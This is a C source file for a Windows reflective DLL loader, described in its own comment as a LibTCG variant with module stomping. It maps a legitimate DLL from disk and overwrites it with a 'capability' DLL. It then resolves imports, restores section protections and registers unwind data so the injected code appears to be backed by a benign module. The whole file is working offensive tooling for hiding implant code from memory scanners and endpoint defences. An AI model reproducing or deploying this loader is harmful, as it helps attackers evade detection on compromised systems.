#include <windows.h>
#include <ntdef.h>
#include "../compost.h"
#include "../tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect (LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle (HANDLE);
WINBASEAPI BOOLEAN NTAPI KERNEL32$RtlAddFunctionTable (PRUNTIME_FUNCTION, DWORD, DWORD64);

NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateSection (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtMapViewOfSection (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtClose (HANDLE);
NTSYSCALLAPI void *NTAPI NTDLL$memset (void*, int, size_t);

WCHAR STOMPABLE_DLL_PATH[256] __attribute__((section(".text")));

BOOL load_stompable_dll(LPCWSTR dllPath, char **mapped_dll, char *preferred_address) {
	NTSTATUS status;
	
	// Open the file.
	HANDLE hFile = KERNEL32$CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	
	// Create a section backed by the file on disk.
	HANDLE hSection;
	status = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
	KERNEL32$CloseHandle(hFile);
	
	if (!NT_SUCCESS(status)) return FALSE;
	
	// Map a view of that section into the current process.
	PVOID mapped = preferred_address;
	SIZE_T viewSize = 0;
	
	status = NTDLL$NtMapViewOfSection(hSection, (HANDLE) -1, &mapped, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
	NTDLL$NtClose(hSection);
	
	if (!NT_SUCCESS(status) || !mapped) return FALSE;
	
	*mapped_dll = (char *) mapped;
	return TRUE;
}

BOOL check_stompable_dll(char *mapped_stompable_dll, char *raw_capability_dll) {
	// Parse the headers of our raw (unmapped) capability.
	DLLDATA data;
	ParseDLL(raw_capability_dll, &data);
	
	// Use the parsed headers to calculate the size of our capability.
	SIZE_T capabilitySize = (SIZE_T) SizeOfDLL(&data);
	
	// Parse our mapped stompable DLL to calculate its size.
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((ULONG_PTR)mapped_stompable_dll + ((PIMAGE_DOS_HEADER)mapped_stompable_dll)->e_lfanew);
	SIZE_T stompableSize = (SIZE_T) ntHeaders->OptionalHeader.SizeOfImage;
	
	if (capabilitySize > stompableSize) return FALSE;
	
	return TRUE;
}

void unprotect_stompable_dll(char *mapped_dll) {
	DWORD oldProt = 0;
	
	// Parse our mapped DLL to calculate its size.
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((ULONG_PTR)mapped_dll + ((PIMAGE_DOS_HEADER)mapped_dll)->e_lfanew);
	
	// Make a best-effort attempt to mark it all as RW.
	KERNEL32$VirtualProtect(mapped_dll, ntHeaders->OptionalHeader.SizeOfImage, PAGE_READWRITE, &oldProt);
	
	// Iterate through sections and mark them each as RW.
	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD sectionCount = ntHeaders->FileHeader.NumberOfSections;
	
	for (DWORD i = 0; i < sectionCount; i++) {
		SIZE_T sectionSize = sectionHeaders[i].SizeOfRawData ? sectionHeaders[i].SizeOfRawData : sectionHeaders[i].Misc.VirtualSize;
		PVOID sectionAddress = (PVOID) ((ULONG_PTR) mapped_dll + sectionHeaders[i].VirtualAddress);
		KERNEL32$VirtualProtect(sectionAddress, sectionSize, PAGE_READWRITE, &oldProt);
	}
}

void stomp_module(char *mapped_dll, char *raw_capability_dll, IMPORTFUNCS *funcs) {
	// Parse the headers of our raw (unmapped) capability.
	DLLDATA data;
	ParseDLL(raw_capability_dll, &data);
	
	// Use the parsed headers to calculate the size of our capability.
	SIZE_T capabilitySize = (SIZE_T) SizeOfDLL(&data);
	
	// Zero out the stompable DLL so our BSS globals start at zero rather than some junk data.
	NTDLL$memset(mapped_dll, 0, capabilitySize);
	
	// Reflectively load our capability.
	LoadDLL(&data, raw_capability_dll, mapped_dll);
	
	// Process imports.
	ProcessImports(funcs, &data, mapped_dll);
}

void reprotect_mapped_dll(char *mapped_dll) {
	DWORD oldProt = 0;
	DWORD newProt = 0;
	
	// Parse our mapped DLL.
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((ULONG_PTR)mapped_dll + ((PIMAGE_DOS_HEADER)mapped_dll)->e_lfanew);
	
	// Iterate through sections and give them the correct memory protections.
	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD sectionCount = ntHeaders->FileHeader.NumberOfSections;
	
	for (DWORD i = 0; i < sectionCount; i++) {
		SIZE_T sectionSize = sectionHeaders[i].SizeOfRawData ? sectionHeaders[i].SizeOfRawData : sectionHeaders[i].Misc.VirtualSize;
		PVOID sectionAddress = (PVOID) ((ULONG_PTR) mapped_dll + sectionHeaders[i].VirtualAddress);
		
    	if ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE )
    		newProt = PAGE_WRITECOPY;
    	if ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_READ )
    		newProt = PAGE_READONLY;
    	if ( ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
    		newProt = PAGE_READWRITE;
    	if ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
    		newProt = PAGE_EXECUTE;
    	if ( ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
    		newProt = PAGE_EXECUTE_WRITECOPY;
    	if ( ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_READ ) )
    		newProt = PAGE_EXECUTE_READ;
    	if ( ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
    		newProt = PAGE_EXECUTE_READWRITE;

    	KERNEL32$VirtualProtect(sectionAddress, sectionSize, newProt, &oldProt);
	}
	
	// Finally, protect the headers as RO.
	KERNEL32$VirtualProtect(mapped_dll, ntHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProt);
}

void register_pdata(char *mapped_dll) {
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((ULONG_PTR)mapped_dll + ((PIMAGE_DOS_HEADER)mapped_dll)->e_lfanew);
	
	IMAGE_DATA_DIRECTORY pExcept = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION) ((ULONG_PTR) mapped_dll + pExcept.VirtualAddress);
	DWORD count = pExcept.Size / sizeof(RUNTIME_FUNCTION);
	KERNEL32$RtlAddFunctionTable(pRF, count, (DWORD64)mapped_dll);
}


void load_dll(char *rawDll, LOADED_DLL *dll) {
	// A variant of the LibTCG reflective loader that also incorporates module stomping. The path of the DLL to be stomped is patched in.

	IMPORTFUNCS funcs;
	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
	
	// Parse the DLL we want to load.
	DLLDATA data;
	ParseDLL(rawDll, &data);
	dll->size = SizeOfDLL(&data);
	
	// Load the stompable DLL.
	char *preferred_base = (char *) data.NtHeaders->OptionalHeader.ImageBase;
	BOOL result = load_stompable_dll((LPCWSTR) STOMPABLE_DLL_PATH, &dll->base, preferred_base);
	
	if (result == FALSE) {
		//dprintf("libtcg_reflective_stomp: FAILED TO LOAD DLL FOR STOMPING!");
		return;
	}
	
	// Make sure that our capability isn't too big to map over it.
	result = check_stompable_dll(dll->base, rawDll);
	if (result == FALSE) {
		//dprintf("libtcg_reflective_stomp: CAPABILITY TOO BIG TO STOMP OVER DLL!");
		return;
	}
	
	// Unprotect the mapped DLL in preparation for stomping.
	unprotect_stompable_dll(dll->base);
	
	// Stomp the DLL.
	stomp_module(dll->base, rawDll, &funcs);
	
	// Reprotect the stomped DLL.
	reprotect_mapped_dll(dll->base);
	
	// Fix the call stack.
	register_pdata(dll->base);
	
	// Get the entrypoint.
	dll->entrypoint = (char *) EntryPoint(&data, dll->base);
}
